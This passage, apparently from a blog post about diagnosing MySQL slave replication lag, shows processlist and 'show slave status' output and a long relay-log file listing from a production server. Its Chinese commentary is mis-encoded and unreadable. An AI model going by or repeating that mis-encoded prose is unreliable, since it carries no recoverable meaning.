hsq_online    | Sleep       |     11 |                                                               | NULL             |</span><br><span class="line">| 317005283 | root   | 10.25.2.85:34854     | hsq_online    | Sleep       |  27800 |                                                               | NULL             |                                                               | NULL             |</span><br><span class="line">| 319272252 | repl   | 10.27.3.27:35818     | NULL          | Binlog Dump |   3014 | Master has sent all binlog to slave; waiting for more updates | NULL             |</span><br><span class="line">                                                             | NULL             |</span><br><span class="line">+-----------+--------+----------------------+---------------+-------------+--------+---------------------------------------------------------------+------------------+</span><br><span class="line">118 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>åªæˆªå–äº†éƒ¨åˆ†æ•°æ®..æ…¢æŸ¥è¯¢æ¡æ•°å¹¶ä¸å¤š,è€Œä¸”binlogä¹Ÿå·²ç»å…¨éƒ¨sendåˆ°slaveäº†..ä¸»åº“è¿™è¾¹ä¸€åˆ‡æ­£å¸¸.</p><p>2.æŸ¥çœ‹ä»åº“çš„çŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 10.81.61.101</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.005022</span><br><span class="line">          Read_Master_Log_Pos: 905366832</span><br><span class="line">               Relay_Log_File: server-6-relay-bin.004891</span><br><span class="line">                Relay_Log_Pos: 925220397</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.004927</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: dwd_analystic,hsq_sync_RDS</span><br><span class="line">          Replicate_Ignore_DB:</span><br><span class="line">           Replicate_Do_Table:</span><br><span class="line">       Replicate_Ignore_Table:</span><br><span class="line">      Replicate_Wild_Do_Table:</span><br><span class="line">  Replicate_Wild_Ignore_Table:</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error:</span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 925220184</span><br><span class="line">              Relay_Log_Space: 102979799744</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File:</span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File:</span><br><span class="line">           Master_SSL_CA_Path:</span><br><span class="line">              Master_SSL_Cert:</span><br><span class="line">            Master_SSL_Cipher:</span><br><span class="line">               Master_SSL_Key:</span><br><span class="line">        Seconds_Behind_Master: 84227</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error:</span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error:</span><br><span class="line">  Replicate_Ignore_Server_Ids:</span><br><span class="line">             Master_Server_Id: 63306</span><br></pre></td></tr></table></figure><p>é™¤äº†Seconds_Behind_Masterå‚æ•°çš„å€¼éå¸¸é«˜ä»¥å¤–ä¹Ÿæ²¡æœ‰å¤ªå¤§é—®é¢˜</p><p>3.æŸ¥çœ‹ä»åº“çš„æ…¢æŸ¥è¯¢æƒ…å†µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show processlist;</span><br><span class="line">+--------+-------------+----------------+--------------+---------+--------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Id     | User        | Host           | db           | Command | Time   | State                            | Info  |</span><br><span class="line">+--------+-------------+----------------+--------------+---------+--------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="line">| 358262 | system user |                | NULL         | Connect | 319299 | Waiting for master to send event | NULL  |</span><br><span class="line">| 358263 | system user |                | NULL         | Connect |  84290 | System lock                      | NULL  |</span><br><span class="line">| 433117 | tongji      | server-5:53032 | hsq_sync_RDS | Query   |   1715 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433118 | tongji      | server-2:54130 | hsq_sync_RDS | Query   |   1714 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433119 | tongji      | server-1:34396 | hsq_sync_RDS | Query   |   1714 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433120 | tongji      | server-6:45128 | hsq_sync_RDS | Query   |   1712 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433181 | tongji      | server-1:34744 | hsq_sync_RDS | Query   |   1626 | Sending data                     | SELECT `id`, `user_id`, `password`, `last_login_ip`, `token`, `session`, `mobile`, `email`, `wechat_ |</span><br><span class="line">| 433206 | tongji      | server-6:45812 | hsq_sync_RDS | Query   |   1587 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433207 | tongji      | server-2:54888 | hsq_sync_RDS | Query   |   1587 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433208 | tongji      | server-4:47770 | hsq_sync_RDS | Query   |   1587 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433209 | tongji      | server-1:35058 | hsq_sync_RDS | Query   |   1586 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433246 | root        | localhost      | NULL         | Query   |      0 | starting                         | show processlist  |</span><br><span class="line">| 433373 | tongji      | server-6:47244 | hsq_sync_RDS | Query   |   1281 | Sending data                     | SELECT `id`, `user_id`, `password`, `last_login_ip`, `token`, `session`, `mobile`, `email`, `wechat_ |</span><br><span class="line">| 433505 | tongji      | server-1:38008 | hsq_sync_RDS | Query   |    797 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433506 | tongji      | server-5:34952 | hsq_sync_RDS | Query   |    797 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433508 | tongji      | server-3:33080 | hsq_sync_RDS | Query   |    796 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433977 | tongji      | server-3:38782 | hsq_sync_RDS | Query   |     53 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433982 | tongji      | server-3:38948 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433983 | tongji      | server-2:35990 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433984 | tongji      | server-6:53400 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433985 | tongji      | server-4:44578 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433986 | tongji      | server-3:38986 | hsq_sync_RDS | Query   |     38 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433997 | tongji      | server-2:36126 | hsq_sync_RDS | Query   |     23 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 434019 | tongji      | server-6:53648 | hsq_sync_RDS | Sleep   |      0 |                                  | NULL  |</span><br><span class="line">+--------+-------------+----------------+--------------+---------+--------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="line">24 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>ä»åº“çš„selectè¯­å¥æ€§èƒ½ä¸æ˜¯å¾ˆå¥½,</p><p>mysqlæ•°æ®æ–‡ä»¶ç›®å½•å­˜åœ¨å¤§é‡çš„binlogæ—¥å¿—.æ˜¾ç„¶ä»åº“çš„æ•°æ®å†™å…¥æœ‰ä¸¥é‡çš„æ»åé—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:04 server-6-relay-bin.004893</span><br><span class="line">-rw-r----- 1 mysql mysql 1074907748 Aug 19 11:20 server-6-relay-bin.004894</span><br><span class="line">-rw-r----- 1 mysql mysql     326897 Aug 19 11:20 server-6-relay-bin.004895</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:20 server-6-relay-bin.004896</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757574 Aug 19 11:35 server-6-relay-bin.004897</span><br><span class="line">-rw-r----- 1 mysql mysql    3014623 Aug 19 11:35 server-6-relay-bin.004898</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:35 server-6-relay-bin.004899</span><br><span class="line">-rw-r----- 1 mysql mysql 1073756933 Aug 19 11:50 server-6-relay-bin.004900</span><br><span class="line">-rw-r----- 1 mysql mysql       1981 Aug 19 11:50 server-6-relay-bin.004901</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:50 server-6-relay-bin.004902</span><br><span class="line">-rw-r----- 1 mysql mysql 1073755064 Aug 19 12:05 server-6-relay-bin.004903</span><br><span class="line">-rw-r----- 1 mysql mysql     461835 Aug 19 12:05 server-6-relay-bin.004904</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:05 server-6-relay-bin.004905</span><br><span class="line">-rw-r----- 1 mysql mysql 1074493379 Aug 19 12:20 server-6-relay-bin.004906</span><br><span class="line">-rw-r----- 1 mysql mysql       2579 Aug 19 12:20 server-6-relay-bin.004907</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:20 server-6-relay-bin.004908</span><br><span class="line">-rw-r----- 1 mysql mysql 1073750403 Aug 19 12:35 server-6-relay-bin.004909</span><br><span class="line">-rw-r----- 1 mysql mysql      38029 Aug 19 12:35 server-6-relay-bin.004910</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:35 server-6-relay-bin.004911</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757889 Aug 19 12:50 server-6-relay-bin.004912</span><br><span class="line">-rw-r----- 1 mysql mysql     472751 Aug 19 12:50 server-6-relay-bin.004913</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:50 server-6-relay-bin.004914</span><br><span class="line">-rw-r----- 1 mysql mysql 1075262040 Aug 19 13:00 server-6-relay-bin.004915</span><br><span class="line">-rw-r----- 1 mysql mysql       3009 Aug 19 13:00 server-6-relay-bin.004916</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:00 server-6-relay-bin.004917</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747998 Aug 19 13:15 server-6-relay-bin.004918</span><br><span class="line">-rw-r----- 1 mysql mysql     421255 Aug 19 13:15 server-6-relay-bin.004919</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:15 server-6-relay-bin.004920</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742443 Aug 19 13:31 server-6-relay-bin.004921</span><br><span class="line">-rw-r----- 1 mysql mysql      21636 Aug 19 13:31 server-6-relay-bin.004922</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:31 server-6-relay-bin.004923</span><br><span class="line">-rw-r----- 1 mysql mysql 1074325521 Aug 19 13:47 server-6-relay-bin.004924</span><br><span class="line">-rw-r----- 1 mysql mysql       8141 Aug 19 13:47 server-6-relay-bin.004925</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:47 server-6-relay-bin.004926</span><br><span class="line">-rw-r----- 1 mysql mysql 1074539167 Aug 19 14:01 server-6-relay-bin.004927</span><br><span class="line">-rw-r----- 1 mysql mysql       3783 Aug 19 14:01 server-6-relay-bin.004928</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:01 server-6-relay-bin.004929</span><br><span class="line">-rw-r----- 1 mysql mysql 1073756221 Aug 19 14:15 server-6-relay-bin.004930</span><br><span class="line">-rw-r----- 1 mysql mysql     505231 Aug 19 14:15 server-6-relay-bin.004931</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:15 server-6-relay-bin.004932</span><br><span class="line">-rw-r----- 1 mysql mysql 1073741891 Aug 19 14:32 server-6-relay-bin.004933</span><br><span class="line">-rw-r----- 1 mysql mysql    2159339 Aug 19 14:32 server-6-relay-bin.004934</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:32 server-6-relay-bin.004935</span><br><span class="line">-rw-r----- 1 mysql mysql 1074633232 Aug 19 14:48 server-6-relay-bin.004936</span><br><span class="line">-rw-r----- 1 mysql mysql       5415 Aug 19 14:48 server-6-relay-bin.004937</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:48 server-6-relay-bin.004938</span><br><span class="line">-rw-r----- 1 mysql mysql 1074746727 Aug 19 15:03 server-6-relay-bin.004939</span><br><span class="line">-rw-r----- 1 mysql mysql       2791 Aug 19 15:03 server-6-relay-bin.004940</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:03 server-6-relay-bin.004941</span><br><span class="line">-rw-r----- 1 mysql mysql 1074641101 Aug 19 15:18 server-6-relay-bin.004942</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 15:18 server-6-relay-bin.004943</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:18 server-6-relay-bin.004944</span><br><span class="line">-rw-r----- 1 mysql mysql 1074670108 Aug 19 15:35 server-6-relay-bin.004945</span><br><span class="line">-rw-r----- 1 mysql mysql     544530 Aug 19 15:35 server-6-relay-bin.004946</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:35 server-6-relay-bin.004947</span><br><span class="line">-rw-r----- 1 mysql mysql 1075095236 Aug 19 15:50 server-6-relay-bin.004948</span><br><span class="line">-rw-r----- 1 mysql mysql     370712 Aug 19 15:50 server-6-relay-bin.004949</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:50 server-6-relay-bin.004950</span><br><span class="line">-rw-r----- 1 mysql mysql 1075138343 Aug 19 16:01 server-6-relay-bin.004951</span><br><span class="line">-rw-r----- 1 mysql mysql       1148 Aug 19 16:01 server-6-relay-bin.004952</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:01 server-6-relay-bin.004953</span><br><span class="line">-rw-r----- 1 mysql mysql 1073753579 Aug 19 16:15 server-6-relay-bin.004954</span><br><span class="line">-rw-r----- 1 mysql mysql     166719 Aug 19 16:15 server-6-relay-bin.004955</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:15 server-6-relay-bin.004956</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744509 Aug 19 16:31 server-6-relay-bin.004957</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 16:31 server-6-relay-bin.004958</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:31 server-6-relay-bin.004959</span><br><span class="line">-rw-r----- 1 mysql mysql 1075785150 Aug 19 16:48 server-6-relay-bin.004960</span><br><span class="line">-rw-r----- 1 mysql mysql       3213 Aug 19 16:48 server-6-relay-bin.004961</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:48 server-6-relay-bin.004962</span><br><span class="line">-rw-r----- 1 mysql mysql 1074787881 Aug 19 17:04 server-6-relay-bin.004963</span><br><span class="line">-rw-r----- 1 mysql mysql       3117 Aug 19 17:04 server-6-relay-bin.004964</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:04 server-6-relay-bin.004965</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742293 Aug 19 17:16 server-6-relay-bin.004966</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 17:16 server-6-relay-bin.004967</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:16 server-6-relay-bin.004968</span><br><span class="line">-rw-r----- 1 mysql mysql 1073875360 Aug 19 17:35 server-6-relay-bin.004969</span><br><span class="line">-rw-r----- 1 mysql mysql     561335 Aug 19 17:35 server-6-relay-bin.004970</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:35 server-6-relay-bin.004971</span><br><span class="line">-rw-r----- 1 mysql mysql 1075427971 Aug 19 17:51 server-6-relay-bin.004972</span><br><span class="line">-rw-r----- 1 mysql mysql     119238 Aug 19 17:51 server-6-relay-bin.004973</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:51 server-6-relay-bin.004974</span><br><span class="line">-rw-r----- 1 mysql mysql 1074518543 Aug 19 18:06 server-6-relay-bin.004975</span><br><span class="line">-rw-r----- 1 mysql mysql       1392 Aug 19 18:06 server-6-relay-bin.004976</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:06 server-6-relay-bin.004977</span><br><span class="line">-rw-r----- 1 mysql mysql 1075430034 Aug 19 18:18 server-6-relay-bin.004978</span><br><span class="line">-rw-r----- 1 mysql mysql        777 Aug 19 18:18 server-6-relay-bin.004979</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:18 server-6-relay-bin.004980</span><br><span class="line">-rw-r----- 1 mysql mysql 1074768456 Aug 19 18:36 server-6-relay-bin.004981</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 18:36 server-6-relay-bin.004982</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:36 server-6-relay-bin.004983</span><br><span class="line">-rw-r----- 1 mysql mysql 1074375191 Aug 19 18:54 server-6-relay-bin.004984</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 18:54 server-6-relay-bin.004985</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:54 server-6-relay-bin.004986</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742784 Aug 19 19:08 server-6-relay-bin.004987</span><br><span class="line">-rw-r----- 1 mysql mysql       5045 Aug 19 19:08 server-6-relay-bin.004988</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 19:08 server-6-relay-bin.004989</span><br><span class="line">-rw-r----- 1 mysql mysql 1074531001 Aug 19 19:24 server-6-relay-bin.004990</span><br><span class="line">-rw-r----- 1 mysql mysql       7092 Aug 19 19:24 server-6-relay-bin.004991</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 19:24 server-6-relay-bin.004992</span><br><span class="line">-rw-r----- 1 mysql mysql 1073942849 Aug 19 19:43 server-6-relay-bin.004993</span><br><span class="line">-rw-r----- 1 mysql mysql       3298 Aug 19 19:43 server-6-relay-bin.004994</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 19:43 server-6-relay-bin.004995</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747538 Aug 19 20:00 server-6-relay-bin.004996</span><br><span class="line">-rw-r----- 1 mysql mysql     358612 Aug 19 20:00 server-6-relay-bin.004997</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:00 server-6-relay-bin.004998</span><br><span class="line">-rw-r----- 1 mysql mysql 1075636850 Aug 19 20:12 server-6-relay-bin.004999</span><br><span class="line">-rw-r----- 1 mysql mysql      12810 Aug 19 20:12 server-6-relay-bin.005000</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:12 server-6-relay-bin.005001</span><br><span class="line">-rw-r----- 1 mysql mysql 1073748897 Aug 19 20:25 server-6-relay-bin.005002</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 20:25 server-6-relay-bin.005003</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:25 server-6-relay-bin.005004</span><br><span class="line">-rw-r----- 1 mysql mysql 1075627773 Aug 19 20:44 server-6-relay-bin.005005</span><br><span class="line">-rw-r----- 1 mysql mysql       1452 Aug 19 20:44 server-6-relay-bin.005006</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:44 server-6-relay-bin.005007</span><br><span class="line">-rw-r----- 1 mysql mysql 1073973063 Aug 19 21:02 server-6-relay-bin.005008</span><br><span class="line">-rw-r----- 1 mysql mysql      12392 Aug 19 21:02 server-6-relay-bin.005009</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:02 server-6-relay-bin.005010</span><br><span class="line">-rw-r----- 1 mysql mysql 1074198559 Aug 19 21:18 server-6-relay-bin.005011</span><br><span class="line">-rw-r----- 1 mysql mysql       9813 Aug 19 21:18 server-6-relay-bin.005012</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:18 server-6-relay-bin.005013</span><br><span class="line">-rw-r----- 1 mysql mysql 1073750958 Aug 19 21:35 server-6-relay-bin.005014</span><br><span class="line">-rw-r----- 1 mysql mysql     415417 Aug 19 21:35 